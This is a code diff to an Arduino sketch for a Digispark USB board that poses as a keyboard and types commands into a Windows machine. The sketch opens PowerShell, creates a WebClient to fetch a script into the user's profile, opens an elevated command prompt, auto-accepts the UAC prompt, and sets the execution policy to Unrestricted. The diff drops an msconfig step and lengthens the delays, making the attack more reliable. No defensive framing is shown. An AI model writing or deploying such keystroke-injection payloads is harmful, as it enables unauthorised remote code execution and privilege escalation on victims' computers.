@@ -15,16 +15,8 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
 
- DigiKeyboard.println("msconfig -5"); // Access CMD
-    DigiKeyboard.delay(1000); 
-    for(int i = 0; i < 14; i++) {
-        DigiKeyboard.sendKeyStroke(KEY_DOWN);
-    }
-  DigiKeyboard.sendKeyStroke(KEY_L, MOD_ALT_LEFT);
-  DigiKeyboard.delay(1000);
-
   DigiKeyboard.println("powershell");
-  DigiKeyboard.delay(300);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.println("$path = \"$env:USERPROFILE\\script2.ps1\"");
   DigiKeyboard.println("$client = new-object System.Net.WebClient");
   DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
@@ -34,9 +26,9 @@ void loop() {
   DigiKeyboard.delay(4000);
 
   DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
-  DigiKeyboard.delay(750);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
-  DigiKeyboard.delay(750);
+  DigiKeyboard.delay(3000);
   DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
   DigiKeyboard.delay(750);
 
